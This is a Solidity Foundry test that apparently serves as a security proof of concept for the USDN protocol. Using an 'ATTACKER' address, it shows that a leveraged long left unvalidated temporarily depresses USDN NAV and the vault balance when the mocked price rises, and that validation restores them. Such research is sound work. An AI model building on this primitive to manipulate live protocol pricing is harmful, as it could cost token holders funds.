// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { UsdnProtocolBaseFixture } from "../test/unit/UsdnProtocol/utils/Fixtures.sol";
import { IUsdnProtocolTypes } from "../src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";

/// @notice Proves that an unvalidated leveraged long temporarily changes USDN NAV when price moves,
/// and that validateOpenPosition later cancels that temporary PnL.
contract PendingOpenNavPoC is UsdnProtocolBaseFixture {
    address internal constant ATTACKER = address(0xBEEF);

    function setUp() public {
        params = DEFAULT_PARAMS;
        // Keep the primitive isolated: funding/fees/rebase/limits are disabled by DEFAULT_PARAMS.
        // This first proof asks only whether pending-open PnL is visible through usdnPrice().
        params.initialLong = 5 ether;
        _setUp(params);
    }

    function test_pendingOpenProfitTemporarilyDepressesUsdnNavAndValidationRestoresIt() public {
        uint128 p0 = params.initialPrice; // $2,000
        uint128 p1 = uint128(uint256(p0) * 105 / 100); // +5%

        // Negative control: what USDN NAV would be at p1 without the attacker's pending position.
        uint256 snap = vm.snapshot();
        skip(31);
        protocol.mockLiquidate(abi.encode(p1));
        uint256 baselineAtP1 = protocol.usdnPrice(p1);
        uint256 baselineVaultAtP1 = protocol.getBalanceVault();
        assertTrue(vm.revertTo(snap), "revert baseline snapshot");

        uint256 navAtP0 = protocol.usdnPrice(p0);

        // Open a high-leverage position, but deliberately stop after initiate.
        // The position is already included in totalExpo/balances while `validated == false`.
        IUsdnProtocolTypes.PositionId memory posId = setUpUserPositionInLong(
            OpenParams({
                user: ATTACKER,
                untilAction: IUsdnProtocolTypes.ProtocolAction.InitiateOpenPosition,
                positionSize: 2 ether,
                desiredLiqPrice: 1600 ether,
                price: p0
            })
        );

        (IUsdnProtocolTypes.Position memory pendingPos,) = protocol.getLongPosition(posId);
        assertFalse(pendingPos.validated, "position must still be pending");

        // A later state update at a higher price credits PnL to the temporary pending long.
        // Since total protocol assets are conserved, that PnL is taken from the vault side.
        protocol.mockLiquidate(abi.encode(p1));
        uint256 navDuringPending = protocol.usdnPrice(p1);
        uint256 vaultDuringPending = protocol.getBalanceVault();

        // Validate at the same p1. USDN deliberately cancels PnL accrued by the temporary
        // pre-validation position and reprices it as if its final entry price were p1.
        vm.prank(ATTACKER);
        (IUsdnProtocolTypes.LongActionOutcome outcome,) =
            protocol.validateOpenPosition(payable(ATTACKER), abi.encode(p1), EMPTY_PREVIOUS_DATA);
        assertEq(uint256(outcome), uint256(IUsdnProtocolTypes.LongActionOutcome.Processed), "open validation outcome");

        uint256 navAfterValidation = protocol.usdnPrice(p1);
        uint256 vaultAfterValidation = protocol.getBalanceVault();

        emit log_named_uint("NAV_AT_P0", navAtP0);
        emit log_named_uint("BASELINE_NAV_AT_P1_NO_PENDING_OPEN", baselineAtP1);
        emit log_named_uint("NAV_DURING_PENDING_OPEN", navDuringPending);
        emit log_named_uint("NAV_AFTER_VALIDATION", navAfterValidation);
        emit log_named_uint("BASELINE_VAULT_AT_P1", baselineVaultAtP1);
        emit log_named_uint("VAULT_DURING_PENDING_OPEN", vaultDuringPending);
        emit log_named_uint("VAULT_AFTER_VALIDATION", vaultAfterValidation);
        emit log_named_uint("TEMPORARY_NAV_DEPRESSION_BPS", (baselineAtP1 - navDuringPending) * 10_000 / baselineAtP1);
        emit log_named_uint("NAV_RECOVERY_BPS_OF_BASELINE", navAfterValidation * 10_000 / baselineAtP1);

        assertLt(navDuringPending, baselineAtP1, "pending leveraged profit must depress USDN NAV");
        assertGt(navAfterValidation, navDuringPending, "validation must restore the temporary NAV loss");
        assertLt(vaultDuringPending, baselineVaultAtP1, "pending PnL must temporarily reduce vault balance");
        assertGt(vaultAfterValidation, vaultDuringPending, "validation must restore vault balance");

        // With fees/funding disabled, validation should restore the no-pending-open economic baseline,
        // modulo only tiny integer/tick rounding.
        assertApproxEqRel(navAfterValidation, baselineAtP1, 0.0005 ether, "NAV should return to baseline within 5 bps");
    }
}
